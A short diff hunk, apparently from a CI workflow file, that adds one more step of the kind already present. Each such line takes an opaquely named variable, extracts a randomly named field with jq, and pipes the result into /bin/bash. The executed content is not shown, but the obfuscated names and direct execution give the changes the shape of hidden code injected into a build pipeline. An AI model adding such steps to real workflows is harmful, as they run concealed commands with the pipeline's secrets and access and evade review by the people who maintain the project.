@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$chj98" | jq -r .x6 | /bin/bash
           printf '%s' "$cwrcw101" | jq -r .i049 | /bin/bash
           printf '%s' "$yll82967" | jq -r .xsd56 | /bin/bash
+          echo $dbwmo5 | jq -r .aw58493 | /bin/bash
 
       - name: Upload artifact
         if: always()
